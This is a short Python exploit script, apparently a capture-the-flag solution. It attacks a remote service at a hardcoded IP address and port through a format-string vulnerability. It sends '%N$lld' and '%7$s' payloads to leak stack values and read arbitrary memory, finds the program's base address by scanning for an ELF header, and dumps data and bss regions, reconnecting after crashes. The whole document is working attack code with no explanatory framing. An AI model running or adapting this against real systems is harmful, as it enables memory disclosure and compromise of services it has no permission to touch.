#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    s.send(fmt+b"\n"); time.sleep(0.12)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    a15=leak_lld(s,15); start=a15&~0xfff
    for delta in range(0,0x20000,0x1000):
        X=start-delta; r=readmem(s,X)
        if r.startswith(b'\x7fELF'): return X
    return None

# scan data/bss offsets; each on a fresh connection to survive crashes
for off in [0x2000,0x3000,0x4000,0x5000,0x6000,0x7000]:
    s=newconn()
    pie=get_pie(s)
    if not pie:
        print(f"off {off:#x}: no pie"); s.close(); continue
    r=readmem(s, pie+off)
    print(f"off {off:#x}: {r!r}")
    s.close()
